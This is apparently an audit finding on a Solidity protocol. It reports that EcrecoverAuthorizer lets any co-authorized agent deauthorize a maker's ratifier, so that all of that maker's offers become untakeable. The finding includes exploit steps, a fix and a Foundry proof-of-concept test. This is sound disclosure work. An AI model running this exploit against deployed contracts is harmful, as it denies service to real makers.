### Title
Co-authorized Agent Can Deauthorize Ratifier via EcrecoverAuthorizer, DoS-ing All Maker Offers - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `isAuthorized[authorization.authorizer][signer]` is true for, not only the authorizer themselves. This means any co-authorized agent of a maker can sign and submit an `Authorization` that sets `isAuthorized[maker][ratifier] = false`, causing every subsequent `take` on that maker's offers to revert with `RatifierUnauthorized`.

### Finding Description

**Code path and root cause:**

`EcrecoverAuthorizer.setIsAuthorized` (src/periphery/EcrecoverAuthorizer.sol:33-36) validates the signer as:

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

If `isAuthorized[victim][attacker] == true`, the attacker's own signature on any `Authorization` struct with `authorizer = victim` passes this check. The function then calls:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

`Midnight.setIsAuthorized` (src/Midnight.sol:731-734) checks:

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
isAuthorized[onBehalf][authorized] = newIsAuthorized;
```

`msg.sender` here is `EcrecoverAuthorizer`, so this passes if `isAuthorized[victim][EcrecoverAuthorizer] == true`.

`Midnight.take` (src/Midnight.sol:355) then enforces:

```solidity
require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
```

**Exploit flow:**

Preconditions (all normal operational state for a maker using EcrecoverAuthorizer):
- `isAuthorized[victim][ratifier] = true` — victim authorized the ratifier for their offers
- `isAuthorized[victim][attacker] = true` — victim authorized attacker as an agent
- `isAuthorized[victim][EcrecoverAuthorizer] = true` — victim authorized EcrecoverAuthorizer (required to use it at all)

Attack:
1. Attacker constructs `Authorization(authorizer=victim, authorized=ratifier, isAuthorized=false, nonce=nonce[victim])`
2. Attacker signs this struct with their own key
3. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)` — passes because `isAuthorized[victim][attacker] == true`
4. `Midnight.setIsAuthorized(ratifier, false, victim)` executes — passes because `isAuthorized[victim][EcrecoverAuthorizer] == true`
5. `isAuthorized[victim][ratifier]` is now `false`
6. Every call to `midnight.take(offer, ...)` where `offer.maker == victim && offer.ratifier == ratifier` reverts with `RatifierUnauthorized`

**Why existing checks fail:**

The nonce check (src/periphery/EcrecoverAuthorizer.sol:26) only prevents replay, not the initial malicious submission. The signer check (line 34) explicitly permits any authorized agent to sign on behalf of the authorizer — there is no restriction preventing an agent from signing a deauthorization of a different agent (including the ratifier). The Certora spec `OnlyAuthorizedCanChange.spec` (line 102-110) formally verifies that authorized agents can change the `isAuthorized` mapping, confirming this is reachable by design, but the DoS consequence on `take` is not guarded against.

### Impact Explanation
All of victim's active maker offers that reference the deauthorized ratifier become permanently untakeable (until victim re-authorizes the ratifier). This is a complete DoS on `take` for those offers with zero cost to the attacker beyond a single transaction. The attacker does not need to hold any tokens or positions.

### Likelihood Explanation
Preconditions are the normal operational state for any maker who uses `EcrecoverAuthorizer` and has delegated any agent. The attack is a single permissionless transaction, repeatable immediately after the victim re-authorizes the ratifier (attacker just increments nonce and re-submits). The attacker only needs to have been granted any authorization by the victim at any point.

### Recommendation
In `EcrecoverAuthorizer.setIsAuthorized`, restrict the signer to only the `authorization.authorizer` themselves — remove the `isAuthorized` delegation path for this function:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

This preserves the gasless/meta-transaction use case (the authorizer signs off-chain and anyone submits) while preventing co-authorized agents from weaponizing the contract to modify the authorizer's authorization mappings.

### Proof of Concept

```solidity
function testCoAgentDeauthorizesRatifier() public {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address ratifier = address(dummyRatifier);

    // Victim sets up normal operational state
    vm.startPrank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    midnight.setIsAuthorized(ratifier, true, victim);
    midnight.setIsAuthorized(attacker, true, victim);
    vm.stopPrank();

    assertTrue(midnight.isAuthorized(victim, ratifier));

    // Attacker signs deauthorization of ratifier on behalf of victim
    Authorization memory auth = Authorization({
        authorizer: victim,
        authorized: ratifier,
        isAuthorized: false,
        nonce: ecrecoverAuthorizer.nonce(victim),
        deadline: block.timestamp + 1 days
    });
    // sign with attacker's key
    Signature memory sig = signAuthorization(auth, attacker);

    // Attacker submits — no victim involvement
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // Ratifier is now deauthorized
    assertFalse(midnight.isAuthorized(victim, ratifier));

    // Any take on victim's offers now reverts
    Offer memory offer;
    offer.buy = true;
    offer.maker = victim;
    offer.ratifier = ratifier;
    offer.maxUnits = 1000;
    offer.market = market;
    offer.expiry = block.timestamp + 200;
    offer.tick = MAX_TICK;

    vm.expectRevert(IMidnight.RatifierUnauthorized.selector);
    vm.prank(makeAddr("taker"));
    midnight.take(offer, hex"", 1, makeAddr("taker"), makeAddr("taker"), address(0), hex"");
}
```

Expected: `assertFalse(midnight.isAuthorized(victim, ratifier))` passes; `take` reverts with `RatifierUnauthorized`.
